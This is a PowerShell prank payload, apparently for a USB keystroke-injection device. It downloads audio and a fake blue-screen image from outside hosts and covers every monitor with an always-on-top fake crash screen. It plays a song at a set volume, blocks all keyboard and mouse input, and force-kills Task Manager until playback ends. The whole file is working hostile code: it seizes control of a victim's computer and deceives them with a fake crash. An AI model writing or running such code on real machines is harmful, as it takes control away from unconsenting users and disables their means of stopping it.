# 1. ASSET CONFIGURATION
$mp3Url = "https://qoret.com/dl/uploads/2019/07/Rick_Astley_-_Never_Gonna_Give_You_Up_Qoret.com.mp3"
$pngUrl = "https://raw.githubusercontent.com/the-weeper-jetlearner/the-rickrollforrubberDuckyUSB-ps1/refs/heads/main/bsod.png"
$workDir = "C:\Users\Public\Music\Cache"

# 2. PREP & DOWNLOAD
if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force }
$mp3 = "$workDir\r.mp3"; $png = "$workDir\b.png"
Invoke-WebRequest -Uri $mp3Url -OutFile $mp3 -UseBasicParsing
Invoke-WebRequest -Uri $pngUrl -OutFile $png -UseBasicParsing

# 3. WIN32 API FOR INPUT BLOCKING & TOPMOST
$code = @"
using System;
using System.Runtime.InteropServices;
public class Win {
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h, IntPtr i, int x, int y, int c, int d, uint f);
    public static readonly IntPtr T = new IntPtr(-1);
}
"@
Add-Type -TypeDefinition $code

# 4. LOAD ENGINES
Add-Type -AssemblyName PresentationCore, System.Windows.Forms, System.Drawing

# 5. GLOBAL AUDIO SETUP (Global prevents garbage collection)
$global:player = New-Object System.Windows.Media.MediaPlayer
$global:player.Open([Uri]$mp3)

# 6. MULTI-SCREEN SETUP
$forms = New-Object System.Collections.Generic.List[System.Windows.Forms.Form]
$global:running = $true

foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $f = New-Object Windows.Forms.Form
    $f.FormBorderStyle = "None"; $f.TopMost = $true; $f.ShowInTaskbar = $false
    $f.StartPosition = "Manual"; $f.Location = $screen.Bounds.Location; $f.Size = $screen.Bounds.Size
    $f.BackgroundImage = [System.Drawing.Image]::FromFile($png); $f.BackgroundImageLayout = "Stretch"
    $f.Show(); $forms.Add($f)
}

# 7. INITIAL VOLUME CALIBRATION (Sets to 50%)
$ws = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 50; $i++) { $ws.SendKeys([char]174) }
for ($i=0; $i -lt 25; $i++) { $ws.SendKeys([char]175) }

# 8. RELIABLE PLAYBACK START
# Wait up to 5 seconds for the media to buffer and play
$timeout = (Get-Date).AddSeconds(5)
$global:player.Play()
while ($global:player.NaturalDuration.HasTimeSpan -eq $false -and (Get-Date) -lt $timeout) { 
    Start-Sleep -Milliseconds 100 
}

try {
    # LOCK INPUT immediately as music starts
    [Win]::BlockInput($true)

    while ($global:running) {
        # Keep BSOD on Top of everything
        foreach ($f in $forms) { 
            [Win]::SetWindowPos($f.Handle, [Win]::T, 0, 0, 0, 0, 0x0001 + 0x0002)
            [Windows.Forms.Application]::DoEvents() 
        }

        # Kill Task Manager if user managed to open it before the block
        Get-Process taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force

        # RE-LOCK Logic: If audio reaches the end OR stops for some reason, unlock and exit
        # NaturalDuration is used to check if the song is finished
        if ($global:player.Position -ge $global:player.NaturalDuration.TimeSpan -and $global:player.NaturalDuration.HasTimeSpan) {
            $global:running = $false
            break
        }

        Start-Sleep -Milliseconds 200
    }
}
finally {
    # UNLOCK INPUT and cleanup
    [Win]::BlockInput($false) 
    foreach ($f in $forms) { $f.Close() }
    $global:player.Stop(); $global:player.Close()
    Remove-Item -Recurse -Force $workDir
    Stop-Process -Id $PID
}
